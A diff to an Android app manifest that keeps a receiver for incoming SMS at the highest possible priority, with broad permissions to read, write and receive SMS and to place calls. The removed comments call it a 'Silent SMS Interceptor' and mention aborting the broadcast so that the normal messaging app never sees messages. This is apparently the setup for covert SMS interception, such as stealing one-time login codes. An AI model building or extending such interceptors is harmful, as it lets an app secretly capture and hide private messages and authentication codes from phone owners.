@@ -3,7 +3,6 @@
     <!-- Telephony & SMS permissions -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.WRITE_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
@@ -23,7 +22,7 @@
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize">
-            
+
             <meta-data
               android:name="io.flutter.embedding.android.NormalTheme"
               android:resource="@style/NormalTheme"
@@ -34,18 +33,18 @@
             </intent-filter>
         </activity>
 
-        <!-- Silent SMS Interceptor Receiver with Highest Priority -->
-        <!-- android:permission BROADCAST_SMS olmadan, ordered broadcast kabul edilir -->
+        <!--
+            SMS_RECEIVED ordered broadcast interceptor.
+            priority=2147483647 → iň ýokary ilerilik, ilki bu alyjy işleýär.
+            android:exported="true" → sistem (UID=1000) bu alyjyya broadcast iberip bilmeli.
+            android:permission="BROADCAST_SMS" → diňe sistem prosesi bu alyjyya ibermeli (howpsuzlyk).
+        -->
         <receiver
             android:name=".SmsReceiver"
-            android:exported="false">
-            <!-- SMS_RECEIVED: ordered broadcast → abortBroadcast() eski Android-da işleýär -->
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-            <!-- SMS_DELIVER: Android 4.4+ default SMS app ýagdaýy (abortBroadcast ýok) -->
-            <intent-filter android:priority="2147483647">
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
             </intent-filter>
         </receiver>
 
